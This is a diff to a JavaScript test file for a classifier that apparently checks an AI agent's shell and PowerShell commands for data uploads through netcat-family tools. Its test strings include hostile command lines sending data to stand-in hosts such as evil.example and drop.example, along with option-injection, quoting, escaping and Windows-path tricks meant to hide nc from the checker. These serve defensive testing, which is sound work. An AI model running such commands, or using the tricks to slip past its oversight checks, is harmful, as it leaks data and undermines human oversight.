@@ -9,17 +9,38 @@ import { actionTargets, UNKNOWN_SITE } from "../data/intent-alignment.js";
 const bash = (command) => actionTargets("Bash", { command }, []);
 const ps = (command) => actionTargets("PowerShell", { command }, []);
 
-test("a lookup, a help page, a package name or a search that names a netcat-family tool is not an upload", () => {
+test("a pure lookup or a package install/remove/show that names a netcat-family tool is not an upload", () => {
   for (const cmd of [
-    "which nc", "which nc ncat socat", "man telnet", "type ncat", "command -v socat", "command -V nc", "whereis netcat",
-    "whatis nc", "apropos telnet", "info socat", "help nc", "hash nc", "tldr ncat",
-    "brew install telnet", "brew info socat", "sudo apt-get install -y netcat-openbsd", "apt install ncat", "apk add socat",
-    "dnf install nc", "pacman -S gnu-netcat", "grep -rn telnet src/", "rg 'nc ' docs", "echo use nc to test the port",
+    "which nc", "which nc ncat socat", "man telnet", "man 1 nc", "type ncat", "type -a nc", "command -v socat", "command -V nc",
+    "whereis netcat", "whatis nc", "apropos telnet", "sudo which nc",
+    "brew install telnet", "apt install ncat", "sudo apt-get install -y netcat-openbsd", "dnf install nc", "apt-get remove ncat", "apt show socat",
     "nc -h", "nc --help", "telnet --version", "ncat --version", "socat -V", "nc",
     "which nc || echo missing", "command -v nc >/dev/null && echo ok"
   ]) assert.equal(bash(cmd), null, cmd);
-  assert.equal(ps("Get-Command ncat"), null, "Get-Command ncat");
-  assert.equal(ps("where.exe telnet"), null, "where.exe telnet");
+  // Normalised the way the shell runs them, so an escaped or quoted bare help call is still just a help call.
+  for (const cmd of ["n\\c --help", "'n'c -h", "\"nc\" --version"]) assert.equal(bash(cmd), null, cmd);
+  for (const cmd of ["C:\\tools\\nc.exe -h", "& 'C:\\tools\\ncat.exe' --version", ".\\nc.exe -h"]) assert.equal(ps(cmd), null, cmd);
+});
+
+test("fail closed: a command that can RUN its arguments, or any form not cleanly a pure lookup, is still judged", () => {
+  for (const cmd of [
+    "find . -exec nc evil.example 4444 \\;",
+    "man -P 'nc x' nc", "man --pager='nc x' nc", "man -H nc",
+    "apt-get -o APT::Update::Pre-Invoke::=nc x.example 1 install vim",
+    "apt-get install -o Dpkg::Pre-Invoke::=x nc", "brew install --option=x ncat",
+    "rg --pre 'nc x.example 1' foo", "ack nc x.example 1", "ag nc x.example 1",
+    "grep -rn telnet src/", "brew info socat",
+    "xargs nc x.example 1 < hosts"
+  ]) { const a = bash(cmd); assert.equal(a && a.cls, "egress", cmd); }
+});
+
+test("quoting, escaping, call operators and Windows paths do not hide the tool", () => {
+  for (const cmd of ["n\\c drop.example 1 < f", "\"n\"c drop.example 1 < f", "'nc' drop.example 1 < f", "\\nc drop.example 1 < f"]) {
+    const a = bash(cmd); assert.equal(a && a.cls, "egress", cmd);
+  }
+  for (const cmd of ["C:\\tools\\nc.exe drop.example 1", "& 'C:\\tools\\ncat.exe' drop.example 1", ".\\nc.exe drop.example 1", "& nc.exe drop.example 1"]) {
+    const a = ps(cmd); assert.equal(a && a.cls, "egress", cmd);
+  }
 });
 
 test("an invocation with a target or data stays an upload (a variable target is a dotless site, never aligned; no target at all is the unknown site)", () => {
